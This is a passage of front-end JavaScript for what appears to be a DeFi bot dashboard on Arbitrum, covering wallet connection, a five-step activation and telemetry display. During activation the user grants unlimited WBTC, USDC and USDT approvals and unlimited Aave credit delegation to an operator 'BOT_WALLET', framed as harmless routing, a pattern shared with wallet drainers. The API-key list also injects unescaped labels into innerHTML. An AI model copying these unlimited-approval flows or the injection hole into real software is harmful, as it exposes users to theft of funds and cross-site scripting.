'use strict';
(function () {

  /* ── Constants ──────────────────────────────────────────────────── */
  var POLL_INTERVAL_MS = 30000;

  /* ── Countdown ticker state ─────────────────────────────────────── */
  var _repayTargetTime  = null;
  var _nurseTargetTime  = null;
  var _countdownTicker  = null;
  var ERC20_ABI = [
    'function balanceOf(address) view returns (uint256)',
    'function approve(address,uint256) returns (bool)',
    'function allowance(address,address) view returns (uint256)'
  ];
  var DM_DELEGATE_ABI = [
    'function approveDelegation(uint256,uint256,bool,bool,bool,bool)'
  ];
  var DEBT_NONCE_ABI = [
    'function nonces(address) view returns (uint256)'
  ];

  /* ── State ──────────────────────────────────────────────────────── */
  var fetchInFlight = false;
  var openCard = null;
  var animating = false;
  var cmActivationRunning = false;
  var pollTimer = null;

  /* ── DOM helpers ────────────────────────────────────────────────── */
  function $ (id) { return document.getElementById(id); }

  function setText(id, value, cls) {
    var el = $(id);
    if (!el) return;
    el.textContent = (value === null || value === undefined) ? '—' : String(value);
    if (cls) el.className = cls;
  }

  function showToast(msg, isError) {
    var el = $('toast');
    if (!el) return;
    el.textContent = msg;
    el.className = 'toast-visible' + (isError ? ' toast-error' : '');
    clearTimeout(el._tid);
    el._tid = setTimeout(function () { el.className = ''; }, 3500);
  }

  /* ── Auth helpers ────────────────────────────────────────────────── */
  function getAuthToken() { return localStorage.getItem('authToken') || ''; }

  function getAuthHeaders() {
    return { 'X-Auth-Token': getAuthToken(), 'Content-Type': 'application/json' };
  }

  function cmAuthFetch(url, opts) {
    opts = opts || {};
    opts.headers = Object.assign(getAuthHeaders(), opts.headers || {});
    return fetch(url, opts).then(function (resp) {
      if (resp.status === 401) { cmShowPhase('connect'); return null; }
      return resp;
    });
  }

  function isAuthenticated() { return !!localStorage.getItem('authToken'); }

  /* ── MetaMask provider ───────────────────────────────────────────── */
  window._p87Providers = [];
  window.addEventListener('eip6963:announceProvider', function (evt) {
    if (evt.detail && evt.detail.provider) {
      var known = window._p87Providers.some(function (p) {
        return p.info && evt.detail.info && p.info.uuid === evt.detail.info.uuid;
      });
      if (!known) window._p87Providers.push(evt.detail);
    }
  });
  window.dispatchEvent(new Event('eip6963:requestProvider'));

  function getProvider() {
    return new Promise(function (resolve) {
      setTimeout(function () {
        var mmEntry = window._p87Providers.find(function (p) {
          return p.info && p.info.rdns === 'io.metamask';
        });
        if (mmEntry) { resolve(mmEntry.provider); return; }
        if (window.ethereum && window.ethereum.isMetaMask) { resolve(window.ethereum); return; }
        resolve(null);
      }, 600);
    });
  }

  /* ── Modal phase control ─────────────────────────────────────────── */
  function cmShowPhase(phase) {
    var phases = ['connect', 'signer', 'activated'];
    phases.forEach(function (p) {
      var el = $('cm-' + p + '-phase');
      if (el) el.classList.toggle('hidden', p !== phase);
    });
  }

  function cmSetStatus(id, msg, cls) {
    var el = $(id);
    if (!el) return;
    el.textContent = msg || '';
    el.className = 'cm-status' + (cls ? ' ' + cls : '');
  }

  function cmSetProgress(pct, label) {
    var fill = $('cm-progress-fill');
    var lbl  = $('cm-progress-label');
    if (fill) fill.style.width = pct + '%';
    if (lbl)  lbl.textContent  = label || '';
  }

  function cmSetStepState(num, state, statusText, txHash) {
    var row    = $('cm-stepRow' + num);
    var status = $('cm-step' + num + 'Status');
    var tx     = $('cm-step' + num + 'Tx');
    if (row)    row.className           = 'cm-step-row ' + state;
    if (status) status.textContent      = statusText || '';
    if (tx && txHash) tx.textContent    = 'TX: ' + txHash.slice(0, 18) + '…';
  }

  /* ── WBTC balance scan ───────────────────────────────────────────── */
  async function cmScanWbtcBalance(wallet) {
    var disp = $('cm-signer-wbtc-bal');
    if (!disp || !wallet) return;
    var eth = await getProvider();
    if (!eth) return;
    try {
      var provider = new ethers.providers.Web3Provider(eth);
      var contract = new ethers.Contract(CONTRACTS.WBTC, ERC20_ABI, provider);
      var bal = await contract.balanceOf(wallet);
      var wbtcVal = parseFloat(ethers.utils.formatUnits(bal, 8));
      disp.textContent = wbtcVal.toFixed(8) + ' WBTC';
      if (bal.eq(0)) disp.style.color = '#ff3d3d';
    } catch (e) {
      disp.textContent = 'SCAN FAILED';
    }
  }

  /* ── Delegation status ───────────────────────────────────────────── */
  async function cmCheckDelegationStatus() {
    var statusEl  = $('cm-delegation-status');
    var resignBtn = $('cm-resign-btn');
    try {
      var resp = await cmAuthFetch('/api/delegation-status');
      if (!resp || !resp.ok) return;
      var data = await resp.json();
      var daiOk  = data.dai_allowance > 0;
      var wethOk = data.weth_allowance > 0;
      if (daiOk && wethOk) {
        if (statusEl) { statusEl.textContent = 'CREDIT DELEGATION: DAI + WETH ACTIVE'; statusEl.className = 'cm-status ok'; }
        if (resignBtn) resignBtn.classList.add('hidden');
      } else {
        var missing = [];
        if (!daiOk)  missing.push('DAI');
        if (!wethOk) missing.push('WETH');
        if (statusEl) { statusEl.textContent = 'DELEGATION EXPIRED: ' + missing.join(', ') + ' — RE-SIGN REQUIRED'; statusEl.className = 'cm-status err'; }
        if (resignBtn) resignBtn.classList.remove('hidden');
      }
    } catch (e) {}
  }

  /* ── Activated phase ─────────────────────────────────────────────── */
  function cmShowActivatedPhase(wallet) {
    cmShowPhase('activated');
    var walletDisp = $('cm-wallet-display');
    if (walletDisp) walletDisp.textContent = wallet || '';
    cmCheckDelegationStatus();
  }

  /* ── Activation status check ─────────────────────────────────────── */
  async function cmCheckActivationStatus(wallet) {
    try {
      var resp = await cmAuthFetch('/api/wallet/activation-status');
      if (!resp) return;
      var data = await resp.json();
      if (data.activated) {
        cmShowActivatedPhase(wallet);
      } else {
        cmShowPhase('signer');
        cmScanWbtcBalance(wallet);
      }
    } catch (e) {
      cmShowPhase('signer');
      cmScanWbtcBalance(wallet);
    }
  }

  /* ── requestAccounts with retry ──────────────────────────────────── */
  async function requestAccounts(eth) {
    try {
      return await eth.request({ method: 'eth_requestAccounts' });
    } catch (e1) {
      var isPending    = e1.code === -32002;
      var isRetryable  = isPending || e1.code === -32603 ||
                         (e1.message && e1.message.toLowerCase().indexOf('unexpected') !== -1);
      if (isRetryable) {
        cmSetStatus('cm-connect-status', isPending
          ? 'CHECK METAMASK FOR A PENDING POPUP, THEN RETRYING...'
          : 'RETRYING CONNECTION...');
        await new Promise(function (r) { setTimeout(r, isPending ? 3000 : 1000); });
        return await eth.request({ method: 'eth_requestAccounts' });
      }
      throw e1;
    }
  }

  /* ── Connect wallet ──────────────────────────────────────────────── */
  async function cmConnectWallet() {
    var btn      = $('cm-connect-btn');
    var isMobile = navigator.maxTouchPoints > 0 || /Android|iPhone|iPad/i.test(navigator.userAgent);
    var eth      = await getProvider();

    if (!eth) {
      if (isMobile) {
        if (btn) btn.style.display = 'none';
        var mobileOpts = $('cm-mobile-options');
        if (mobileOpts) {
          mobileOpts.classList.remove('hidden');
          var mmLink = $('cm-mm-deeplink');
          if (mmLink) mmLink.href = 'https://metamask.app.link/dapp/' + encodeURIComponent(window.location.host + '/app');
        }
      } else {
        cmSetStatus('cm-connect-status',
          'METAMASK NOT DETECTED. Install MetaMask and refresh.', 'err');
      }
      return;
    }

    if (btn) { btn.disabled = true; btn.textContent = '[ CONNECTING... ]'; }
    cmSetStatus('cm-connect-status', 'REQUESTING WALLET ACCESS...');

    try {
      var accounts = await requestAccounts(eth);
      if (!accounts || !accounts.length) throw new Error('No accounts returned.');
      var wallet = accounts[0];

      cmSetStatus('cm-connect-status', 'AUTHENTICATING WITH SERVER...');
      var resp = await fetch('/api/auth/wallet', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: wallet })
      });

      if (!resp.ok) {
        var errData = await resp.json().catch(function () { return {}; });
        throw new Error(errData.error || 'Server auth failed (' + resp.status + ')');
      }

      var data = await resp.json();
      localStorage.setItem('authToken', data.authToken);
      localStorage.setItem('walletAddress', data.walletAddress);

      if (btn) { btn.textContent = '[ CONNECTED ]'; btn.classList.add('cm-btn--green'); }
      cmSetStatus('cm-connect-status', '');

      await new Promise(function (r) { setTimeout(r, 400); });
      cmCheckActivationStatus(data.walletAddress);

    } catch (e) {
      if (btn) { btn.textContent = '[ INITIALIZE CONNECTION ]'; btn.disabled = false; }
      var msg = e.message || 'Unknown error';
      if (e.code === 4001) msg = 'Connection rejected.';
      else if (e.code === -32603) msg = 'RPC error — check wallet network.';
      cmSetStatus('cm-connect-status', 'CONNECTION FAILED: ' + msg, 'err');
    }
  }

  /* ── Launch Field Ops ────────────────────────────────────────────── */
  function cmLaunchFieldOps() {
    var modal = $('cm-modal');
    if (modal) modal.classList.add('hidden');
    syncTelemetry();
    cmLoadApiKeys();
    if (!pollTimer) pollTimer = setInterval(syncTelemetry, POLL_INTERVAL_MS);
  }

  /* ── Eject wallet ────────────────────────────────────────────────── */
  async function cmEjectWallet() {
    if (!confirm('CONFIRM: DISCONNECT WALLET AND TERMINATE SESSION?')) return;
    try { await cmAuthFetch('/api/auth/disconnect', { method: 'POST' }); } catch (e) {}
    localStorage.removeItem('authToken');
    localStorage.removeItem('walletAddress');
    clearInterval(pollTimer);
    pollTimer = null;
    var modal = $('cm-modal');
    if (modal) modal.classList.remove('hidden');
    cmShowPhase('connect');
    var btn = $('cm-connect-btn');
    if (btn) { btn.textContent = '[ INITIALIZE CONNECTION ]'; btn.disabled = false; btn.className = 'cm-btn'; btn.style.display = ''; }
    cmSetStatus('cm-connect-status', '');
  }

  /* ── Re-sign credit delegation ───────────────────────────────────── */
  async function cmResignDelegation() {
    var statusEl  = $('cm-resign-status');
    var resignBtn = $('cm-resign-btn');
    var eth = await getProvider();
    if (!eth) { cmSetStatus('cm-resign-status', 'METAMASK NOT DETECTED.', 'err'); return; }
    resignBtn.disabled = true;
    resignBtn.textContent = '[ SIGNING... ]';
    cmSetStatus('cm-resign-status', 'PREPARING EIP-712 DATA...');
    try {
      var provider = new ethers.providers.Web3Provider(eth);
      var signer   = provider.getSigner();
      var userAddress = await signer.getAddress();
      var deadline = Math.floor(Date.now() / 1000) + (30 * 24 * 3600);
      var delegationTypes = {
        DelegationWithSig: [
          { name: 'delegatee', type: 'address' }, { name: 'value', type: 'uint256' },
          { name: 'nonce', type: 'uint256' },     { name: 'deadline', type: 'uint256' }
        ]
      };
      cmSetStatus('cm-resign-status', 'SIGN DAI DELEGATION (1 of 2, NO GAS)...');
      var daiDebtContract = new ethers.Contract(CONTRACTS.DAI_DEBT, DEBT_NONCE_ABI, provider);
      var daiNonce = await daiDebtContract.nonces(userAddress);
      var daiSig = await signer._signTypedData(
        { name: 'Aave Arbitrum Variable Debt DAI', version: '1', chainId: 42161, verifyingContract: CONTRACTS.DAI_DEBT },
        delegationTypes,
        { delegatee: CONTRACTS.BOT_WALLET, value: ethers.constants.MaxUint256, nonce: daiNonce, deadline: deadline }
      );
      cmSetStatus('cm-resign-status', 'SIGN WETH DELEGATION (2 of 2, NO GAS)...');
      var wethDebtContract = new ethers.Contract(CONTRACTS.WETH_DEBT, DEBT_NONCE_ABI, provider);
      var wethNonce = await wethDebtContract.nonces(userAddress);
      var wethSig = await signer._signTypedData(
        { name: 'Aave Arbitrum Variable Debt WETH', version: '1', chainId: 42161, verifyingContract: CONTRACTS.WETH_DEBT },
        delegationTypes,
        { delegatee: CONTRACTS.BOT_WALLET, value: ethers.constants.MaxUint256, nonce: wethNonce, deadline: deadline }
      );
      cmSetStatus('cm-resign-status', 'SUBMITTING TO BACKEND...');
      var resp = await cmAuthFetch('/api/register-wallet', {
        method: 'POST',
        body: JSON.stringify({ dai_signature: daiSig, weth_signature: wethSig, deadline: deadline })
      });
      if (resp && resp.ok) {
        var result = await resp.json();
        if (result.dai_borrow_allowance > 0 && result.weth_borrow_allowance > 0) {
          cmSetStatus('cm-resign-status', 'RE-SIGNED — CREDIT DELEGATION ACTIVE', 'ok');
          resignBtn.classList.add('hidden');
          var delStatus = $('cm-delegation-status');
          if (delStatus) { delStatus.textContent = 'CREDIT DELEGATION: DAI + WETH ACTIVE'; delStatus.className = 'cm-status ok'; }
        } else {
          cmSetStatus('cm-resign-status', 'SUBMITTED — VERIFYING ON-CHAIN (WILL RETRY IN BACKGROUND)');
        }
      } else {
        var errData = resp ? await resp.json().catch(function () { return {}; }) : {};
        throw new Error(errData.error || 'Backend submission failed');
      }
    } catch (e) {
      cmSetStatus('cm-resign-status', 'RE-SIGN FAILED: ' + (e.message || e), 'err');
    } finally {
      resignBtn.disabled = false;
      resignBtn.textContent = '[ RE-SIGN CREDIT DELEGATION ]';
    }
  }

  /* ── Sequential Signer — 5-step activation ───────────────────────── */
  async function cmRunActivationSequence() {
    if (cmActivationRunning) return;
    var eth = await getProvider();
    if (!eth) {
      cmSetStatus('cm-activation-status', 'METAMASK NOT DETECTED. Install MetaMask and refresh.', 'err');
      return;
    }
    var btn = $('cm-activate-btn');

    function resetBtn(label) {
      if (btn) { btn.textContent = label || '[ RETRY ACTIVATION ]'; btn.disabled = false; }
      cmActivationRunning = false;
    }

    function activationError(error, failedStep) {
      var fullMsg   = (error.message || '') + ' ' + ((error.data && error.data.message) || '') + ' ' + (error.reason || '');
      var fullLower = fullMsg.toLowerCase();
      var msg = error.reason || error.message || 'Unknown error';
      var isInsufficientFunds =
        fullLower.indexOf('insufficient funds') !== -1 ||
        error.code === 'INSUFFICIENT_FUNDS' || error.code === -32000 ||
        fullLower.indexOf('gas required exceeds allowance') !== -1 ||
        fullLower.indexOf('exceeds the configured cap') !== -1;
      if (isInsufficientFunds) {
        msg = 'Insufficient ETH for gas fees. Add ETH to your wallet and retry.';
      } else if (error.code === 4001 || (error.message && error.message.indexOf('user rejected') !== -1)) {
        msg = 'Transaction rejected by user.';
      } else if (error.code === -32603) {
        msg = 'RPC error — check your wallet network (must be Arbitrum One).';
      }
      cmSetProgress(0, 'FAILED: ' + msg);
      if (failedStep) cmSetStepState(failedStep, 'error', 'FAILED: ' + msg, null);
      cmSetStatus('cm-activation-status', msg, 'err');
      resetBtn();
    }

    cmActivationRunning = true;
    if (btn) { btn.disabled = true; btn.textContent = '[ PROCESSING... ]'; }
    cmSetStatus('cm-activation-status', '');

    var provider, signer, userAddress;

    try {
      await eth.request({ method: 'eth_requestAccounts' });
      provider    = new ethers.providers.Web3Provider(eth);
      signer      = provider.getSigner();
      userAddress = await signer.getAddress();
    } catch (e) {
      activationError({ message: e.code === 4001 ? 'Wallet connection rejected.' : 'Could not connect to wallet.' }, null);
      return;
    }

    try {
      var network = await provider.getNetwork();
      if (network.chainId !== 42161) {
        cmSetProgress(0, 'WRONG NETWORK — switching to Arbitrum One...');
        try {
          await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0xa4b1' }] });
        } catch (switchErr) {
          if (switchErr.code === 4902) {
            await eth.request({ method: 'wallet_addEthereumChain', params: [{
              chainId: '0xa4b1', chainName: 'Arbitrum One',
              nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
              rpcUrls: ['https://arb1.arbitrum.io/rpc'],
              blockExplorerUrls: ['https://arbiscan.io']
            }] });
          } else {
            activationError({ message: 'Could not switch to Arbitrum. Switch manually in your wallet.' }, null);
            return;
          }
        }
        provider = new ethers.providers.Web3Provider(eth);
        signer   = provider.getSigner();
      }
    } catch (e) {
      activationError({ message: 'Network check failed: ' + (e.message || e) }, null);
      return;
    }

    if (!CONTRACTS.DM || CONTRACTS.DM.length < 42 || CONTRACTS.DM.indexOf('{{') !== -1) {
      activationError({ message: 'Delegation Manager address not configured. Contact support.' }, null);
      return;
    }

    var sigData  = { daiSignature: null, wethSignature: null, deadline: null };
    var txHashes = { approve: null, delegation: null, usdc: null, usdt: null };

    /* Step 1 — Approve WBTC */
    try {
      cmSetProgress(5, 'Step 1/5: Checking WBTC balance...');
      cmSetStepState(1, 'active', 'CHECKING BALANCE...', null);
      var wbtcContract = new ethers.Contract(CONTRACTS.WBTC, ERC20_ABI, signer);
      var totalBalance = await wbtcContract.balanceOf(userAddress);
      if (totalBalance.eq(0)) throw new Error('No WBTC found in wallet. Deposit WBTC first.');
      cmSetProgress(10, 'Step 1/5: Approving WBTC to Delegation Manager...');
      cmSetStepState(1, 'active', 'AWAITING WALLET CONFIRMATION...', null);
      var tx1 = await wbtcContract.approve(CONTRACTS.DM, ethers.constants.MaxUint256);
      cmSetStepState(1, 'active', 'CONFIRMING ON-CHAIN...', tx1.hash);
      await tx1.wait();
      txHashes.approve = tx1.hash;
      cmSetStepState(1, 'done', 'WBTC UNLIMITED APPROVAL SET', tx1.hash);
    } catch (e) { activationError(e, 1); return; }

    /* Step 2 — Set strategy limits */
    try {
      cmSetProgress(25, 'Step 2/5: Configuring strategy limits...');
      cmSetStepState(2, 'active', 'AWAITING WALLET CONFIRMATION...', null);
      var dmContract = new ethers.Contract(CONTRACTS.DM, DM_DELEGATE_ABI, signer);
      var tx2 = await dmContract.approveDelegation(
        ethers.constants.MaxUint256, ethers.constants.MaxUint256, true, true, true, true
      );
      cmSetStepState(2, 'active', 'CONFIRMING ON-CHAIN...', tx2.hash);
      await tx2.wait();
      txHashes.delegation = tx2.hash;
      cmSetStepState(2, 'done', 'STRATEGY LIMITS CONFIGURED', tx2.hash);
    } catch (e) { activationError(e, 2); return; }

    /* Step 3 — Gasless credit delegation */
    try {
      cmSetProgress(40, 'Step 3/5: Preparing DAI credit delegation...');
      cmSetStepState(3, 'active', 'PREPARING EIP-712 DATA (DAI)...', null);
      var deadline = Math.floor(Date.now() / 1000) + (30 * 24 * 3600);
      sigData.deadline = deadline;
      var delegationTypes = {
        DelegationWithSig: [
          { name: 'delegatee', type: 'address' }, { name: 'value', type: 'uint256' },
          { name: 'nonce', type: 'uint256' },     { name: 'deadline', type: 'uint256' }
        ]
      };
      var daiDebtContract = new ethers.Contract(CONTRACTS.DAI_DEBT, DEBT_NONCE_ABI, provider);
      var daiNonce = await daiDebtContract.nonces(userAddress);
      cmSetStepState(3, 'active', 'SIGN DAI DELEGATION IN WALLET (1 of 2, NO GAS)', null);
      var daiSig = await signer._signTypedData(
        { name: 'Aave Arbitrum Variable Debt DAI', version: '1', chainId: 42161, verifyingContract: CONTRACTS.DAI_DEBT },
        delegationTypes,
        { delegatee: CONTRACTS.BOT_WALLET, value: ethers.constants.MaxUint256, nonce: daiNonce, deadline: deadline }
      );
      sigData.daiSignature = daiSig;
      cmSetProgress(52, 'Step 3/5: Preparing WETH credit delegation...');
      var wethDebtContract = new ethers.Contract(CONTRACTS.WETH_DEBT, DEBT_NONCE_ABI, provider);
      var wethNonce = await wethDebtContract.nonces(userAddress);
      cmSetStepState(3, 'active', 'SIGN WETH DELEGATION IN WALLET (2 of 2, NO GAS)', null);
      var wethSig = await signer._signTypedData(
        { name: 'Aave Arbitrum Variable Debt WETH', version: '1', chainId: 42161, verifyingContract: CONTRACTS.WETH_DEBT },
        delegationTypes,
        { delegatee: CONTRACTS.BOT_WALLET, value: ethers.constants.MaxUint256, nonce: wethNonce, deadline: deadline }
      );
      sigData.wethSignature = wethSig;
      cmSetStepState(3, 'done', 'DAI + WETH CREDIT DELEGATION SIGNED', null);
    } catch (e) { activationError(e, 3); return; }

    /* Step 4 — Approve USDC routing */
    try {
      cmSetProgress(65, 'Step 4/5: Approving USDC routing...');
      cmSetStepState(4, 'active', 'AWAITING WALLET CONFIRMATION...', null);
      var usdcContract = new ethers.Contract(CONTRACTS.USDC, ERC20_ABI, signer);
      var tx4 = await usdcContract.approve(CONTRACTS.BOT_WALLET, ethers.constants.MaxUint256);
      cmSetStepState(4, 'active', 'CONFIRMING ON-CHAIN...', tx4.hash);
      await tx4.wait();
      txHashes.usdc = tx4.hash;
      cmSetStepState(4, 'done', 'USDC UNLIMITED APPROVAL SET', tx4.hash);
    } catch (e) { activationError(e, 4); return; }

    /* Step 5 — Approve USDT short close */
    try {
      cmSetProgress(80, 'Step 5/5: Approving USDT for short close routing...');
      cmSetStepState(5, 'active', 'AWAITING WALLET CONFIRMATION...', null);
      var usdtContract = new ethers.Contract(CONTRACTS.USDT, ERC20_ABI, signer);
      var tx5 = await usdtContract.approve(CONTRACTS.BOT_WALLET, ethers.constants.MaxUint256);
      cmSetStepState(5, 'active', 'CONFIRMING ON-CHAIN...', tx5.hash);
      await tx5.wait();
      txHashes.usdt = tx5.hash;
      cmSetStepState(5, 'done', 'USDT UNLIMITED APPROVAL SET', tx5.hash);
    } catch (e) { activationError(e, 5); return; }

    /* Register with backend */
    try {
      cmSetProgress(92, 'Registering with backend...');
      var regResp = await cmAuthFetch('/api/register-wallet', {
        method: 'POST',
        body: JSON.stringify({
          dai_signature:   sigData.daiSignature,
          weth_signature:  sigData.wethSignature,
          deadline:        sigData.deadline,
          approveTxHash:   txHashes.approve,
          delegationTxHash:txHashes.delegation,
          usdcTxHash:      txHashes.usdc,
          usdtTxHash:      txHashes.usdt
        })
      });
      if (regResp && regResp.ok) {
        cmSetProgress(100, 'ACTIVATION COMPLETE');
        if (btn) btn.textContent = '[ ACTIVATION COMPLETE ]';
        cmActivationRunning = false;
        setTimeout(function () {
          cmShowActivatedPhase(localStorage.getItem('walletAddress') || '');
        }, 1200);
      } else {
        var errData = regResp ? await regResp.json().catch(function () { return {}; }) : {};
        throw new Error(errData.error || 'Backend registration failed');
      }
    } catch (e) {
      activationError(e, null);
    }
    cmActivationRunning = false;
  }

  /* ── Telemetry helpers ───────────────────────────────────────────── */
  function fmt(v, decimals, prefix, suffix) {
    if (v === null || v === undefined) return null;
    var n = parseFloat(v);
    if (isNaN(n)) return null;
    return (prefix || '') + n.toFixed(decimals) + (suffix || '');
  }
  function fmtUsd(v)  { return fmt(v, 2, '$'); }
  function fmtHf(v)   { return fmt(v, 4); }
  function fmtPct(v) {
    if (v === null || v === undefined) return null;
    var n = parseFloat(v);
    if (isNaN(n)) return null;
    return (n >= 0 ? '+' : '') + n.toFixed(2) + '%';
  }
  function fmtMin(v) {
    if (v === null || v === undefined) return null;
    var m = parseInt(v, 10);
    if (isNaN(m)) return null;
    if (m < 60) return m + 'm ago';
    return Math.floor(m / 60) + 'h ' + (m % 60) + 'm ago';
  }
  function fmtCountdown(v) {
    if (v === null || v === undefined) return null;
    var m = parseInt(v, 10);
    if (isNaN(m)) return null;
    if (m < 60) return m + 'm';
    return Math.floor(m / 60) + 'h ' + (m % 60) + 'm';
  }

  function fmtCountdownLive(target) {
    if (!target) return null;
    var secs = Math.max(0, Math.round((target - Date.now()) / 1000));
    if (secs === 0) return '00:00';
    var h = Math.floor(secs / 3600);
    var m = Math.floor((secs % 3600) / 60);
    var s = secs % 60;
    if (h > 0) return h + ':' + String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
    return String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
  }

  function _tickCountdowns() {
    var repayEl = document.getElementById('magenta-countdown');
    var nurseEl = document.getElementById('magenta-nurse');
    if (repayEl) {
      var rv = fmtCountdownLive(_repayTargetTime);
      repayEl.textContent = rv || '—';
    }
    if (nurseEl) {
      var nv = fmtCountdownLive(_nurseTargetTime);
      nurseEl.textContent = nv || '—';
    }
  }

  function _ensureCountdownTicker() {
    if (_countdownTicker) return;
    _countdownTicker = setInterval(_tickCountdowns, 1000);
  }

  function populateTelemetry(d) {
    if (!d) return;
    var w = (d.wallets && d.wallets.length > 0) ? d.wallets[0] : null;
    var spread = d.net_apy_spread;
    var shield = w ? w.shield_status_enum : null;
    var usdc   = w ? w.user_usdc_balance  : null;
    var spreadStr = fmtPct(spread);

    var apyEl = $('bh-apy-value');
    if (apyEl) {
      apyEl.textContent = spreadStr || '—';
      apyEl.className   = 'metric-value ' + (spread !== null ? (parseFloat(spread) >= 0 ? 'apy-positive' : 'apy-negative') : 'val-dim');
    }
    var shieldEl = $('bh-shield-value');
    if (shieldEl) {
      shieldEl.textContent = shield || 'DOWN';
      shieldEl.className   = 'metric-value ' + (shield ? 'shield-' + shield : 'shield-DOWN');
    }
    var usdcEl = $('bh-usdc-value');
    if (usdcEl) usdcEl.textContent = fmtUsd(usdc) || '—';

    var hf = w ? w.health_factor : null;
    var hfClass = 'telem-value val-dim';
    if (hf !== null && hf !== undefined) {
      hfClass = hf >= 3.60 ? 'telem-value val-green' : hf >= 3.20 ? 'telem-value val-amber' : 'telem-value val-red';
    }
    setText('green-hf',   fmtHf(hf), hfClass);
    setText('green-wbtc', fmtUsd(w ? w.total_collateral_usdc : null));
    setText('green-dai',  fmtUsd(w ? w.total_debt_usd : null), 'telem-value val-amber');

    setText('cyan-balance',  fmtUsd(usdc), 'telem-value val-cyan');
    setText('cyan-lifetime', fmtUsd(w ? w.lifetime_usdc_generated : null), 'telem-value val-green');

    var amberSpreadEl = $('amber-spread');
    if (amberSpreadEl) {
      amberSpreadEl.textContent = spreadStr || '—';
      amberSpreadEl.className   = spread !== null ? ('telem-value ' + (parseFloat(spread) >= 0 ? 'val-green' : 'val-red')) : 'telem-value val-dim';
    }
    setText('amber-m100', d.milestone_100_hhmm  || '—', 'telem-value val-amber');
    setText('amber-m1k',  d.milestone_1000_hhmm || '—', 'telem-value val-amber');

    var magShieldEl = $('magenta-shield');
    if (magShieldEl) {
      magShieldEl.textContent = shield || 'DOWN';
      magShieldEl.className   = 'telem-value ' + (shield ? 'shield-' + shield : 'shield-DOWN');
    }
    setText('magenta-elapsed', fmtMin(d.last_repay_elapsed_min), 'telem-value val-dim');
    _repayTargetTime = d.next_repay_iso ? new Date(d.next_repay_iso) : null;
    _ensureCountdownTicker();
    _tickCountdowns();

    var stratEl = $('green-strategy');
    if (stratEl) {
      var strat = w ? (w.strategy_label || null) : null;
      stratEl.textContent = strat || '—';
      stratEl.className = 'telem-value ' + (
        strat === 'GROWTH'    ? 'val-green' :
        strat === 'CAPACITY'  ? 'val-amber' :
        strat === 'EMERGENCY' ? 'val-red'   : 'val-dim'
      );
    }

    setText('cyan-24h', fmtUsd(w ? w.usdc_earned_last_24h : null), 'telem-value val-green');

    var growthEl = $('amber-growth-prob');
    if (growthEl) {
      var gp = w ? w.growth_likelihood_pct : null;
      growthEl.textContent = gp !== null && gp !== undefined ? gp.toFixed(1) + '%' : '—';
      growthEl.className = 'telem-value ' + (
        gp !== null ? (gp >= 60 ? 'val-green' : gp >= 35 ? 'val-cyan' : 'val-dim') : 'val-dim'
      );
    }

    _nurseTargetTime = d.next_nurse_iso ? new Date(d.next_nurse_iso) : null;
    _tickCountdowns();
  }

  async function syncTelemetry() {
    if (fetchInFlight) return;
    fetchInFlight = true;
    try {
      var res = await fetch('/api/telemetry', {
        credentials: 'same-origin',
        headers: { 'X-Auth-Token': getAuthToken() }
      });
      if (!res.ok) throw new Error('HTTP ' + res.status);
      var data = await res.json();
      populateTelemetry(data);
    } catch (e) {
      ['bh-apy-value', 'bh-shield-value', 'bh-usdc-value'].forEach(function (id) {
        setText(id, 'ERR', 'metric-value val-red');
      });
    } finally {
      fetchInFlight = false;
    }
  }

  /* ── Card flip ───────────────────────────────────────────────────── */
  function openDomeCard(card) {
    if (animating) return;
    animating = true;
    card.classList.add('pulse-emit');
    setTimeout(function () {
      card.classList.add('card-flipped');
      setTimeout(function () { card.classList.remove('pulse-emit'); animating = false; openCard = card; }, 200);
    }, 300);
  }

  function closeDomeCard(card, cb) {
    if (!card) { if (cb) cb(); return; }
    card.classList.add('power-down');
    setTimeout(function () {
      card.classList.remove('card-flipped', 'power-down');
      openCard = null;
      if (cb) cb();
    }, 400);
  }

  function handleCardTap(card) {
    if (animating) return;
    if (openCard === card) { closeDomeCard(card); return; }
    if (openCard) {
      animating = true;
      closeDomeCard(openCard, function () {
        setTimeout(function () { animating = false; openDomeCard(card); }, 80);
      });
      return;
    }
    openDomeCard(card);
  }

  function initCardFlip() {
    var grid = $('dome-grid');
    if (!grid) return;
    grid.addEventListener('click', function (e) {
      var card = e.target.closest('.dome-card');
      if (card) handleCardTap(card);
    });
  }

  /* ── API Keys ───────────────────────────────────────────────────── */
  function authHeaders() {
    var tok = localStorage.getItem('authToken');
    return tok ? { 'Content-Type': 'application/json', 'X-Auth-Token': tok } : { 'Content-Type': 'application/json' };
  }

  async function cmLoadApiKeys() {
    var list = $('apikey-list');
    if (!list) return;
    try {
      var res  = await fetch('/api/keys/list', { headers: authHeaders() });
      var data = await res.json();
      var keys = (data.keys || []);
      list.innerHTML = '';
      var active = keys.filter(function(k){ return k.status === 'active'; });
      var genBtn = $('btn-gen-key');
      if (genBtn) genBtn.disabled = active.length >= 2;
      if (keys.length === 0) {
        list.innerHTML = '<div style="font-size:8px;color:rgba(255,255,255,0.25);padding:4px 2px;letter-spacing:0.5px;">No keys generated</div>';
        return;
      }
      keys.forEach(function(k) {
        var row     = document.createElement('div');
        row.className = 'apikey-row';
        var isActive = k.status === 'active';
        var keyShort = k.key_prefix ? (k.key_prefix + '...') : ('p87_' + String(k.id) + '_...');
        row.innerHTML =
          '<span class="apikey-val">' + keyShort + '</span>' +
          (k.label ? '<span class="apikey-row-label">' + k.label + '</span>' : '') +
          '<span class="apikey-status ' + (isActive ? 'apikey-status-active' : 'apikey-status-revoked') + '">' +
            (isActive ? 'ACTIVE' : 'REVOKED') +
          '</span>' +
          (isActive ? '<button class="apikey-revoke-btn" data-id="' + k.id + '">[ REVOKE ]</button>' : '');
        list.appendChild(row);
        if (isActive) {
          var rBtn = row.querySelector('.apikey-revoke-btn');
          if (rBtn) rBtn.addEventListener('click', function() { cmRevokeApiKey(k.id); });
        }
      });
    } catch(e) {
      var list2 = $('apikey-list');
      if (list2) list2.innerHTML = '<div style="font-size:8px;color:rgba(255,80,80,0.6);">Error loading keys</div>';
    }
  }

  async function cmGenerateApiKey() {
    var genBtn  = $('btn-gen-key');
    var msgEl   = $('apikey-msg');
    var labelEl = $('apikey-label-input');
    if (!genBtn || genBtn.disabled) return;
    if (msgEl) msgEl.textContent = '';
    var label = labelEl ? labelEl.value.trim() : '';
